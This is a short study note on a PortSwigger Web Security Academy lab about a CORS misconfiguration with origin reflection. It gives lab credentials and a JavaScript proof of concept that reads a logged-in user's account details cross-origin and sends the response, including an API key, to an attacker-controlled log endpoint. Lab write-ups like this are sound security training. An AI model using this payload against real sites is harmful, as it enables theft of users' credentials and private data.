---
tags:
  - APPRENTICE
Link:
  - "[[CORS]]"
External Link:
  - https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
---

# CORS vulnerability with basic origin reflection
---

**Target Goal** - Exploit the CORS misconfiguration to retrieve the administrator's API key

**Creds** - wiener : peter

**Analysis:**

**Testing for CORS misconfigurations:**
1. Change the origin to an arbitrary value - True

**POC**:

```html
<script>
	var url = "http://YOUR-LAB-ID.web-security-academy.net"
	var req = new XMLHttpRequest();
	req.onreadystatechange = reqListener;
	req.open('GET', url + '/accountDetails', true);
	req.withCredentials = true;
	req.send(null);
	
	
	function reqListener(){
		if(req.readyState == XMLHttpRequest.DONE){
			fetch("/log?key=" + req.responseText)
		}
	}

</script>
```






































